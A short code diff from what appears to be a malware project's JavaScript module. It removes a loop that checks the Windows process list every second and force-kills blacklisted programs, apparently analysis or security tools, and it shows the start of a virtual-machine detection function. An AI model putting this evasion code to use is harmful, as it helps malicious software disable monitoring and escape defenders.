@@ -1,19 +1,6 @@
 module.exports = (client) => {
     return {
 
-        async detect_malicious_processes() {
-            while (true) {
-                await client.requires.child_process.exec('tasklist', async(err, stdout) => {
-                    for (const executable of client.config.environ.blacklisted_programs) {
-                        if (stdout.toLowerCase().includes(executable)) {
-                            await client.requires.child_process.exec(`taskkill /IM ${executable}.exe /F`, (err) => {}) // Close
-                        }
-                    }
-                })
-                await client.utils.time.sleep(1000);
-            }
-        },
-
         async inVM() {
 
             let result = false
